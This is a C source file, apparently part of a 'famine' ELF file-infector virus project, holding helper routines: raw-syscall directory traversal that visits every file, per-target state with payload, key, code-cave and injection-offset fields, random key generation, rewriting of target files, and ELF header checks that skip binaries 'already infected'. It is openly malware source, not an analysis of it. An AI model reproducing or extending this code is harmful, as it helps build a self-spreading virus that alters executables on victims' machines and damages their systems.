# include "../includes/famine.h"

void clear_env(t_env *env) {
	if (env->obj_cpy)
		syscall_munmap(env->obj_cpy, env->new_obj_size + 1);
	if (env->payload_content)
		syscall_munmap(env->payload_content, env->payload_size + 16);
	if (env->obj_name) {
		syscall_munmap(env->obj_name, env->obj_name_size);
	}
	syscall_munmap(env, sizeof(t_env));
}

t_env *set_env() {
	t_env *env;
	if ((env = syscall_mmap(0, sizeof(t_env), PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0)) == MAP_FAILED) {
		return NULL;
	}
	ft_bzero(env, sizeof(t_env));
	env->obj = NULL;
	env->obj_name = NULL;
	env->obj_name_size = 0;
	ft_bzero(env->key, 17);
	env->encrypt_size = 0;
	env->main_offset = 0;
	env->obj_cpy = NULL;
	env->obj_size = 0;
	env->new_obj_size = 0;
	env->obj_base = 0;
	env->payload_file = NULL;
	env->payload_content = NULL;
	env->payload_size = 0;
	env->load_align = 0;
	env->entrypoint = 0;
	env->plt_offset = 0;
	env->found_code_cave = 0;
	env->found_code_cave_id = 0;
	env->inject_offset = 0;
	env->inject_addr = 0;

	return env;
}


int listdir(char *target) {
	int d;
	char buf[1024];
	struct dirent *dir;
	long nread = 0;
	t_env *env;

	if ((d = syscall_openat(AT_FDCWD, target, O_RDONLY|O_NONBLOCK|O_DIRECTORY|O_CLOEXEC)) == -1) {
		return -1;
	}
	if ((dir = syscall_mmap(0, sizeof(struct dirent), PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0)) == MAP_FAILED) {
		return -1;
	}
	if (d > 0) {
		ft_bzero(dir, sizeof(struct dirent));
		while ((nread = syscall_getdents(d, buf, 1024)) > 0) {
			for (long bpos = 0; bpos < nread;) {
				dir = (struct dirent *) (buf + bpos);
				if (ft_strcmp(dir->d_name, ".") != 0 && ft_strcmp(dir->d_name, "..") != 0) {
					if ((env = set_env()) == NULL) {
						syscall_munmap(dir, sizeof(struct dirent));
						return -1;
					}
					env->obj_name_size = ft_strlen(target) + ft_strlen(dir->d_name) + 1;
					if ((env->obj_name = syscall_mmap(0, env->obj_name_size, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0)) == MAP_FAILED) {
						syscall_munmap(dir, sizeof(struct dirent));
						return -1;
					}
					ft_bzero(env->obj_name, env->obj_name_size);
					ft_strcpy(env->obj_name, target);
					ft_strcat(env->obj_name, dir->d_name);
					read_obj(env);
					clear_env(env);
				}
				bpos += dir->d_reclen;
			}
		}
		syscall_close(d);
	}
	syscall_munmap(dir, sizeof(struct dirent));
	return 0;
}

int dump_obj(t_env *env) {
	int fd;

	if ((fd = syscall_open_3(env->obj_name, O_WRONLY | O_CREAT | O_TRUNC, 0755)) < 0) {
		//if (DEBUG) printf("Error creating '%s' file.\n", env->obj_name);
		return (-1);
	}
	syscall_write(fd, env->obj_cpy, env->new_obj_size);
	syscall_close(fd);
	return (0);
}

int generate_key(t_env *env) {
	int fd = 0;

	if ((fd = syscall_open_2("/dev/urandom", O_RDONLY)) < 0) {
		return -1;
	}
	if (syscall_read(fd, env->key, 16) < 0) {
		return -1;
	}
	env->key[16] = 0;
	return 0;
}

uint32_t ft_swap_32(uint32_t n) {
	n = ((n << 8) & 0xFF00FF00) | ((n >> 8) & 0xFF00FF);
	return ((n << 16) | (n >> 16));
}

uint64_t ft_swap_64(uint64_t n) {
	n = ((n << 8) & 0xFF00FF00FF00FF00) | ((n >> 8) & 0x00FF00FF00FF00FF);
	n = ((n << 16) & 0xFFFF0000FFFF0000) | ((n >> 16) & 0x0000FFFF0000FFFF);
	return ((n << 32) | (n >> 32));
}

uint32_t cpu_32(uint32_t n, uint8_t cpu) {
	if (cpu != 0)
		return (ft_swap_32(n));
	return (n);
}

uint64_t cpu_64(uint64_t n, uint8_t cpu) {
	if (cpu != 0)
		return (ft_swap_64(n));
	return (n);
}

/*void debug_dump(t_env *env, unsigned int *content, unsigned int start_addr, size_t size) {
	printf("\nDEBUG: size = %ld bytes", size);
	for (size_t j = 0; j * 4 < size; j += 1)
	{
		if (j % 4 == 0)
			printf("\n %04lx - ", start_addr + j * 4);
		printf("%08x ", cpu_32(content[j], env->cpu));
	}
	printf("\n");
}*/

int check_corruption(void *obj, size_t size) {
	if (((char*)obj)[0] != 0x7f || \
		((char*)obj)[1] != 'E' || \
		((char*)obj)[2] != 'L' || \
		((char*)obj)[3] != 'F' || \
		((char*)obj)[4] != ELFCLASS64) {
		//if (DEBUG) printf("%s is not an ELF64. Exiting...\n", obj_name);
		return -1;
	}
	// get obj header
	Elf64_Ehdr *ehdr = (Elf64_Ehdr *)obj;
	// get pheader number
	int phnum = ehdr->e_phnum;
	// get first p_header
	Elf64_Phdr *phdr = (Elf64_Phdr *)(obj + ehdr->e_phoff);
	if (ehdr->e_type > 3) {
		//if (DEBUG) printf("Corrupted e_type %d in %s. Exiting...\n", ehdr->e_type, obj_name);
		return -1;
	}
	if (ehdr->e_ehsize >= 65535 || ehdr->e_ehsize <= 0) {
		//if (DEBUG) printf("Corrupted ehsize %d in %s. Exiting...\n", ehdr->e_ehsize, obj_name);
		return -1;
	}
	if (ehdr->e_phoff != ehdr->e_ehsize) {
		//if (DEBUG) printf("Corrupted e_phoff %ld in %s. Exiting...\n", ehdr->e_phoff, obj_name);
		return -1;
	}
	if (phnum >= 65535 || phnum <= 0) {
		//if (DEBUG) printf("Corrupted phnum %d in %s. Exiting...\n", ehdr->e_phnum, obj_name);
		return -1;
	}
	if (ehdr->e_phentsize >= 65535 || ehdr->e_phentsize <= 0) {
		//if (DEBUG) printf("Corrupted phentsize %d in %s. Exiting...\n", ehdr->e_phentsize, obj_name);
		return -1;
	}
	if (ehdr->e_shentsize >= 65535 || ehdr->e_shentsize <= 0) {
		//if (DEBUG) printf("Corrupted shentsize %d in %s. Exiting...\n", ehdr->e_shentsize, obj_name);
		return -1;
	}
	if (ehdr->e_shstrndx >= 65535 || ehdr->e_shstrndx <= 0) {
		//if (DEBUG) printf("Corrupted shstrndx %d in %s. Exiting...\n", ehdr->e_shstrndx, obj_name);
		return -1;
	}
	// get sections number
	int shnum = ehdr->e_shnum;
	// get first section header
	Elf64_Shdr *shdr = (Elf64_Shdr *)(obj + ehdr->e_shoff);
	if (shnum >= 65535 || shnum <= 0) {
		//if (DEBUG) printf("Corrupted shnum %d in %s. Exiting...\n", ehdr->e_shnum, obj_name);
		return -1;
	}
	// get str table
	Elf64_Shdr *sh_strtab = &shdr[ehdr->e_shstrndx];
	if (sh_strtab->sh_offset >= size || sh_strtab->sh_offset <= 0) {
		//if (DEBUG) printf("Corrupted shstrtab_offset %ld in %s. Exiting...\n", sh_strtab->sh_offset, obj_name);
		return -1;
	}
	const char *sh_strtab_p = obj + sh_strtab->sh_offset;
	int prev_type = 0;
	int load_found = 0;
	unsigned int obj_base = 0;
	for (int i = 0; i < phnum; ++i) {
		if (prev_type == PT_DYNAMIC && phdr[i].p_type == PT_LOAD) {
			//if (DEBUG) printf("It is likely that %s have already been infected with PT_LOAD following a PT_NOTE. \nExiting...\n", obj_name);
			return -1;
		}
		if (phdr[i].p_type == 0) {
			//if (DEBUG) printf("Corrupted p_type %d in %s. Exiting...\n", phdr[i].p_type, obj_name);
			return -1;
		}
		// get base address
		if (load_found == 0 && phdr[i].p_type == PT_LOAD) {
			obj_base = phdr[i].p_vaddr;
			load_found = 1;
		}
		if (phdr[i].p_type == PT_LOAD && (phdr[i].p_flags & 5) == 5 && i + 1 < phnum) {
			if (phdr[i].p_filesz >= 0xffffffffffffffff || (int)phdr[i].p_filesz <= 0) {
				//if (DEBUG) printf("Corrupted p_filesz %ld in %s. Exiting...\n", phdr[i].p_filesz, obj_name);
				return -1;
			}
			if (phdr[i].p_memsz >= 0xffffffffffffffff || (int)phdr[i].p_memsz <= 0) {
				//if (DEBUG) printf("Corrupted p_memsz %ld in %s. Exiting...\n", phdr[i].p_memsz, obj_name);
				return -1;
			}
			if (phdr[i].p_offset >= 0xffffffffffffffff) {
				//if (DEBUG) printf("Corrupted p_offset %ld in %s. Exiting...\n", phdr[i].p_offset, obj_name);
				return -1;
			}
			if (phdr[i].p_paddr >= 0xffffffffffffffff) {
				//if (DEBUG) printf("Corrupted p_paddr %ld in %s. Exiting...\n", phdr[i].p_paddr, obj_name);
				return -1;
			}
			if (phdr[i].p_vaddr >= 0xffffffffffffffff) {
				//if (DEBUG) printf("Corrupted p_vaddr %ld in %s. Exiting...\n", phdr[i].p_vaddr, obj_name);
				return -1;
			}
		}
		prev_type = phdr[i].p_type;
	}
	for (int i = 0; i < shnum; ++i) {
		char c = -1;
		int ic = -1;
		while (c) {
			ic++;
			c = sh_strtab_p[shdr[i].sh_name + ic];
		}
		if (i > 0 && ic == 0) {
			//printf("Corrupted sh_name %d in %s. Exiting...\n", shdr[i].sh_name, obj_name);
			return -1;
		}
		if ((int)shdr[i].sh_name < 0 || sh_strtab->sh_offset + shdr[i].sh_name > size) {
			//if (DEBUG) printf("Corrupted sh_name %d in %s. Exiting...\n", shdr[i].sh_name, obj_name);
			return -1;
		}
		if (ft_strcmp(sh_strtab_p + shdr[i].sh_name, ".fini") == 0 && ehdr->e_entry - obj_base > shdr[i].sh_offset) {
			//if (DEBUG) printf("It is likely that %s have already been infected in PT_LOAD code cave. \nExiting...\n", obj_name);
			return -1;
		}
		if (ft_strcmp(sh_strtab_p + shdr[i].sh_name, ".text") == 0) {
			if (shdr[i].sh_addr >= 0xffffffffffffffff || shdr[i].sh_addr <= 0) {
				//if (DEBUG) printf("Corrupted sh_addr %ld in %s. Exiting...\n", shdr[i].sh_addr, obj_name);
				return -1;
			}
			if (shdr[i].sh_offset >= 0xffffffffffffffff || shdr[i].sh_offset <= 0) {
				//if (DEBUG) printf("Corrupted sh_offset %ld in %s. Exiting...\n", shdr[i].sh_offset, obj_name);
				return -1;
			}
			if (shdr[i].sh_size >= 0xffffffffffffffff || shdr[i].sh_size <= 0) {
				//if (DEBUG) printf("Corrupted sh_size %ld in %s. Exiting...\n", shdr[i].sh_size, obj_name);
				return -1;
			}
		}
	}
	return 0;
}